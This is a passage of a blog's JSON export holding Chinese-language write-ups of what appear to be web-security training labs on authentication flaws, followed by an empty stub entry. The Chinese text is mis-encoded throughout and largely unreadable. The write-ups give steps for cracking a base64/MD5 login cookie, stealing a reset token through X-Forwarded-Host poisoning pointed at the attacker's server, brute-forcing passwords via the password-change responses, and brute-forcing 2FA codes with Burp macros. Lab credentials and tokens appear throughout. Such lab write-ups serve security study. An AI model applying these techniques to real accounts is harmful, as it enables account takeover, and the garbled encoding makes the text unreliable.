éœ€è¦è®¾ç½®å¥½payloadçš„å¤„ç†æ–¹å¼ï¼Œå…ˆå¯¹å¯†ç è¿›è¡ŒMD5åŠ å¯†ï¼Œä¹‹åæ·»åŠ å‰ç¼€carlos:ï¼Œæœ€åè¿›è¡Œbaes64åŠ å¯†ï¼Œä¹‹åå¼€å§‹çˆ†ç ´ æ ¹æ®é•¿åº¦æ’åº Y2FybG9zOjlkZjNiMDFjNjBkZjIwZDEzODQzODQxZmYwZDQ0ODJj base64è§£å¯†ï¼šcarlos:9df3b01c60df20d13843841ff0d4482c MD5è§£å¯†ï¼šaccess æˆåŠŸ Offline password crackingé¦–å…ˆåˆ©ç”¨ç°æœ‰å‡­æ®wiener:peterç™»å½•ï¼Œä¹‹åå»é¦–é¡µéšä¾¿æ‰¾ä¸€ç¯‡åšå®¢è¯„è®º ä¹‹åå»access logé‡Œæ‰¾åˆ°stay-logged-inï¼šY2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz base64è§£å¯†ï¼šcarlos:26323c16d5f4dabff3bb136f2460a943 MD5è§£å¯†ï¼šonceuponatime ä¹‹ååˆ é™¤carlosçš„è´¦æˆ·å³å¯æˆåŠŸ Password reset poisoning via middlewareé¦–å…ˆï¼Œç‚¹å‡»å¿˜è®°å¯†ç ï¼Œè¾“å…¥carlosçš„ç”¨æˆ·åï¼Œç‚¹å‡»submitåç”¨burpæ‹¦æˆªï¼Œåœ¨headerä½ç½®æ·»åŠ X-Forwarded-Hostå¹¶æŒ‡å‘è‡ªå·±çš„æœåŠ¡å™¨ ä¹‹åå»æœåŠ¡å™¨çš„æ—¥å¿—ä¸­æŸ¥çœ‹å‘ç°è·å–åˆ°äº†carlosçš„tokenï¼š3ek1baacsobkwf15q6sqjetimcb6atm8 ä¹‹åç™»å½•wienerçš„è´¦å·å¹¶å»è·å–wienerçš„é‚®ç®±è´¦å·ï¼Œå¹¶å¡«å†™åœ¨å¿˜è®°å¯†ç é¡µé¢çš„ä¿¡æ¯æ ä¸­ å‰å¾€é‚®ç®±è·å–åˆ°é‡ç½®å¯†ç çš„urlï¼Œå°†tokenæ”¹ä¸ºcarlosçš„tokenå¹¶è®¿é—® ä¿®æ”¹å¥½å¯†ç ååœ¨ç‚¹å‡»æäº¤æ—¶æ‹¦æˆªï¼Œå°†tokenæ”¹ä¸ºcarlosçš„tokenå¹¶å‘é€ ä¹‹åç”¨ä¿®æ”¹åçš„å¯†ç ç™»å½•carloså³å¯æˆåŠŸ Password brute-force via password changeé¦–å…ˆç™»å½•wiener:peterï¼Œä¹‹åé€šè¿‡ä¿®æ”¹å¯†ç æŸ¥çœ‹è¿”å›ä¿¡æ¯ å½“åŸå¯†ç æ­£ç¡®ï¼Œæ–°å¯†ç ä¸ä¸€è‡´æ—¶ï¼Œæç¤ºNew passwords do not match å½“åŸå¯†ç é”™è¯¯ï¼Œæ–°å¯†ç ä¸ä¸€è‡´æ—¶ï¼Œæç¤ºCurrent password is incorrect å› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ–°å¯†ç ä¸ä¸€è‡´æ¥çˆ†ç ´åŸå¯†ç  è½½å…¥å­—å…¸ï¼Œå¹¶è®¾ç½®å¥½åŒ¹é…å…³é”®å­— çˆ†ç ´æˆåŠŸ ä¹‹åä½¿ç”¨carlos:654321ç™»å½•å³å¯å®Œæˆ Broken brute-force protection, multiple credentials per requestç™»å½•æ‹¦æˆªï¼Œå‘ç°ä»¥jsonæ ¼å¼å‘é€ç™»å½•å‡­æ® æ•…å°†å­—å…¸ä¿®æ”¹æ ¼å¼ ä¹‹åä»¥[æ•°æ®å—]çš„æ ¼å¼å‘é€å¯†ç å³å¯æˆåŠŸ 2FA bypass using a brute-force attackå…ˆåˆ©ç”¨carlos:montoyaè¿›å…¥éªŒè¯ç ç•Œé¢ï¼Œéšä¾¿è¾“å…¥éªŒè¯ç æµ‹è¯•ï¼Œå‘ç°è¾“å…¥ä¸¤æ¬¡é”™è¯¯éªŒè¯ç åä¼šè‡ªåŠ¨ç»ˆæ­¢ä¼šè¯ï¼Œä½†æ˜¯ï¼Œè¯¥ç”¨æˆ·å¹¶æœªè¢«é”å®šï¼Œæ„å‘³ç€æˆ‘å¯ä»¥æ— é™åˆ¶åœ°å°è¯•ã€‚ å¦‚æœæ¯æ¬¡å°è¯•2FAä¼šä¸æ–­å˜åŒ–ï¼Œæˆ‘ä»¬æ²¡æœ‰åŠæ³•çˆ†ç ´ï¼Œä½†å¦‚æœ2FAåœ¨ä½¿ç”¨ä¹‹å‰éƒ½ä¸€ç›´æœ‰æ•ˆï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯å¯¹å…¶è¿›è¡Œæš´åŠ›ç ´è§£ã€‚ ç™»å½•è¿‡ç¨‹æ¶‰åŠå¤šä¸ªéœ€è¦æŒ‰é¡ºåºæ‰§è¡Œçš„è¯·æ±‚ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å®ï¼Œå¹¶å°è¯•å°†è¿™äº›è¯·æ±‚åˆå¹¶åˆ°ä¸€ä¸ªå®ä¸­ã€‚ æ“ä½œæ­¥éª¤å¦‚ä¸‹ï¼š &lt;1&gt;ç™»å½•carlos:montoya &lt;2&gt;éšä¾¿è¾“å…¥ä¸€ä¸ªéªŒè¯ç ï¼Œç‚¹å‡»æäº¤ï¼ŒæŠ¥é”™ &lt;3&gt;è¿›å…¥burpï¼ŒProject optionsçš„sessionsï¼Œåœ¨Macroä¸­é€‰æ‹©å¦‚ä¸‹çš„ä¸‰ä¸ªåŒ…ï¼Œå¹¶Test macroæ­£å¸¸ &lt;4&gt;è¿›å…¥session handling rulesï¼Œç‚¹å‡»Addï¼Œåœ¨ Scopeçš„URL Scopeä¸­, é€‰æ‹©é€‰é¡¹ Include all URLsï¼›åœ¨Detailsä¸­ç‚¹å‡»Addé€‰æ‹©Run a marcoï¼Œå¹¶å°†&lt;3&gt;ä¸­çš„marcoåŠ è¿›å» &lt;5&gt;å°†POST &#x2F;login2å‘é€ç»™Intruderï¼Œå°†å­—å…¸è®¾ç½®ä¸º0000-9999ï¼Œçº¿ç¨‹æ•°è®¾ä¸º1ï¼Œçˆ†ç ´éªŒè¯ç å³å¯ (çˆ†ç ´é€Ÿåº¦è¶…çº§æ…¢ï¼Œä¸å»ºè®®å°è¯•ï¼Œç­‰ä¹‹åæœ‰æ—¶é—´å†åšå§)","categories":[],"tags":[]},{"title":"YulinSec-Recruit-2023-WP","slug":"YulinSec-Recruit-2023-WP","date":"2023-10-31T01:54:13.746Z","updated":"2024-07-26T03:02:40.713Z","comments":true,"path":"2023/10/31/YulinSec-Recruit-2023-WP/","link":"","permalink":"http://example.com/2023/10/31/YulinSec-Recruit-2023-WP/","excerpt":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2023&#x2F;10&#x2F;18 åˆ†ç±»ï¼šwriteup","text":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2023&#x2F;10&#x2F;18 åˆ†ç±»ï¼šwriteup æš‚æ—¶å…³é—­","categories":[],"tags":[]}],"categories":[],"tags":[]}